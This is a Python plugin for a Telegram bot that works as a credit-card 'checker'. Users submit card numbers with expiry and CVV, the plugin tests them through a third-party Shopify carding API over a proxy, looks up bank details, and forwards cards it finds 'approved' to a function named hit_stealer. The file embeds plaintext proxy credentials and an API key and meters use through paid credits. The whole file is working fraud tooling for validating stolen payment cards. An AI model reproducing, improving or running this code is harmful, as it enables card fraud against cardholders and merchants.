from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
import httpx, re, time
from httpx import AsyncHTTPTransport
from plugins.func.users_sql import fetchinfo, updatedata, plan_expirychk
from plugins.tools.hit_stealer import send_hit_if_approved

@Client.on_message(filters.command("sh", prefixes=["/", "."]), group=95)
async def cmd_sh(client, message):
    try:
        user_id = str(message.from_user.id)
        chat_id = message.chat.id
        chat_type = message.chat.type

        regdata = fetchinfo(user_id)
        if not regdata:
            return await message.reply("❌ You are not registered. Use /register first.")

        role = regdata[2].upper() if regdata[2] else "FREE"
        credit = int(regdata[5] or 0)
        wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
        antispam_time = int(regdata[7] or 0)
        now = int(time.time())

        if chat_type == ChatType.PRIVATE and role == "FREE":
            return await message.reply(
                "⚠️ <b>Premium Users Required</b>\nOnly Premium users can use this in bot PM.\nJoin our group to use it for FREE:",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
                ]),
                disable_web_page_preview=True
            )

        with open("plugins/group.txt") as f:
            allowed_groups = f.read().splitlines()
        if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in allowed_groups:
            return await message.reply("❌ Unauthorized group. Contact admin.")

        if credit < 1:
            return await message.reply("❌ Insufficient credit.")
        if now - antispam_time < wait_time:
            return await message.reply(f"⏳ Wait {wait_time - (now - antispam_time)}s")

        cc_text = message.reply_to_message.text if message.reply_to_message else (
            message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
        )
        if not cc_text:
            return await message.reply("❌ Usage: /sh <cc|mm|yy|cvv>")

        match = re.search(r"(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})", cc_text)
        if not match:
            return await message.reply("❌ Invalid format. Use cc|mm|yy|cvv")

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        check_msg = await message.reply(
f"""<code>┏━━━━━━━⍟</code>
<b>┃  Shopify 0.99$</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> Checking...
<b>⊙ Response:</b> Waiting...""")

        tic = time.perf_counter()

        card_status = "declined"
        card_message = "Request failed"
        brand = type_ = level = bank = country = "N/A"
        flag = "🏳️"

        # Shopify check
        try:
            async with httpx.AsyncClient(timeout=30) as http_client:
                headers = {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "User-Agent": "Mozilla/5.0"
                }
                payload = {
                    "key": "VDX-SHA2X-NZ0RS-O7HAM",
                    "data": {
                        "card": fullcc,
                        "product_url": "https://godless.com/collections/the-drop-all-new-shit/products/the-excretorcist-by-reekfeel",
                        "email": None,
                        "proxy": "proxy.ziny.io:1000:coopertimothy:OioZ6u9Z86O9ZVKzmBhy_country-us",
                        "ship_address": None,
                        "is_shippable": False
                    }
                }

                res = await http_client.post("https://api.voidapi.xyz/v2/shopify_graphql", json=payload, headers=headers)

                try:
                    data = res.json()
                    raw_msg = data.get("message") or data.get("error") or "No response"
                except:
                    raw_msg = res.text or "No response"

                msg_check = raw_msg.lower()
                card_status = "approved" if any(x in msg_check for x in ["processedreceipt", "zip", "avs", "incorrect_cvc", "insufficient", "charged"]) else "declined"
                card_message = raw_msg
        except Exception as e:
            card_message = f"Request failed: {e}"

        # BIN check (always runs, even if Shopify fails)
        bin_proxies = [
            "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000",
            "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000",
            "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
        ]
        for proxy in bin_proxies:
            try:
                bin_transport = AsyncHTTPTransport(proxy=proxy)
                async with httpx.AsyncClient(transport=bin_transport, timeout=10) as bin_client:
                    binres = await bin_client.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}")
                    if binres.status_code == 200:
                        bininfo = binres.json()
                        brand = str(bininfo.get("brand") or bininfo.get("scheme") or "N/A").upper()
                        type_ = str(bininfo.get("type", "N/A")).upper()
                        level = str(bininfo.get("level", "N/A")).upper()
                        bank = str(bininfo.get("bank", "N/A")).upper()
                        country = str(bininfo.get("country_name", "N/A")).upper()
                        flag = bininfo.get("country_flag", "🏳️")
                        break
            except:
                continue

        toc = time.perf_counter()
        status = "Approved ✅" if card_status == "approved" else "Declined ❌"

        final_msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Shopify 0.99$ </b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ Bin type:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        try:
            if check_msg.text != final_msg:
                await check_msg.edit_text(final_msg)
        except Exception as e:
            if "MESSAGE_NOT_MODIFIED" not in str(e):
                await message.reply(f"❌ Error: {str(e)}")

        if "approved" in status.lower() or "live" in card_message.lower():
            await send_hit_if_approved(client, final_msg)

        updatedata(user_id, "credits", credit - 1)
        updatedata(user_id, "antispam_time", now)
        plan_expirychk(user_id)

    except Exception as e:
        await message.reply(f"❌ Error: {str(e)}")
